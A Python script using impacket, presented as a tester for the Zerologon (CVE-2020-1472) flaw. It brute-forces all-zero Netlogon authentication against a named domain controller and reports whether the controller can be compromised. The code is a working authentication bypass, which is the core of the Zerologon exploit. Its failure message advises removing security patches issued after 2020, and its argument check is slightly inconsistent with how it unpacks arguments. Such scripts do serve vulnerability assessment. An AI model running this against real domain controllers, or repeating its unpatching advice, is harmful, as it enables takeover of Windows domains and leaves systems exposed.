#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
RATIO = 256
MAX_ATTEMPTS = RATIO * 10  # False negative chance: 0.04%

# This function closes the program if something went wrong
def fail(msg: str):
    print(msg, file=sys.stderr)
    print(
        "This might have been caused by invalid arguments or network issues.",
        file=sys.stderr,
    )
    sys.exit(2)

# Attempt Zerologon authentication
def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b"\x00" * 8
    ciphertext = b"\x00" * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212FFFFF

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(
        rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext
    )
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            dc_handle + "\x00",
            target_computer + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + "\x00",
            ciphertext,
            flags,
        )

        # It worked!
        assert server_auth["ErrorCode"] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xC0000022:
            return

        fail(f"Unexpected error code from DC: {ex.get_error_code()}.")
    except BaseException as ex:
        fail(f"Unexpected error: {ex}.")


def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print("Attempting attack...")
    rpc_con = None
    for _ in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

        if rpc_con:
            break
        
        print(".", end="", flush=True)

    if not rpc_con:
        print("\nAttack failed. The DC is probably patched.")
        print("\nTry to remove any security patches installed with date after 2020")
        sys.exit(1)

    print("\nSuccess! DC can be fully compromised by a Zerologon attack.")

if __name__ == "__main__":
    if  not (3 <= len(sys.argv) <= 4):
        
        print("Usage: zerologon_tester.py <dc-name> <dc-ip>\n")
        print(
            "Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes."
        )
        print(
            "Note: dc-name should be the (NetBIOS) computer name of the domain controller."
        )
        sys.exit(1)
    
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip("$")
    perform_attack("\\\\" + dc_name, dc_ip, dc_name)

    
